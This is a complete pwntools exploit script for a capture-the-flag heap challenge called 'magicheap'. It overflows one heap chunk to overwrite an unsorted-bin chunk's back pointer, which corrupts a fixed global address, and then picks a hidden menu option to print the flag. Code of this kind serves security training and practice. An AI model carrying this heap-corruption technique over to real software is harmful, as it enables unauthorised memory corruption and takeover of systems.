#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

if args['DEBUG']:
    context.log_level = 'debug'

r = process('./magicheap')


def create_heap(size, content):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)


def edit_heap(idx, size, content):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)


def del_heap(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))

def hack():
    #gdb.attach(r)
#stage1:layout 
    create_heap(0x10,'a')  # id 0
    create_heap(0x100,'b') # id 1
    create_heap(0x10,'c') #in order to avoid consolidate with top
    del_heap(1)
    addr = 0x6020c0
    payload = 'z' * 0x10 + p64(0) + p64(0x111) + p64(0) + p64(addr-0x10) #overflow,rewrite unsorted chunk->bck
    edit_heap(0,len(payload),payload)
    create_heap(0x100,'d') # trigger unsorted bin attack
#get flag 
    r.recvuntil('Your choice :')
    r.sendline('4869') 
    flag = r.recvline()
    log.success("get the flag:" + flag)
    r.interactive()

if __name__ == '__main__':
    hack()
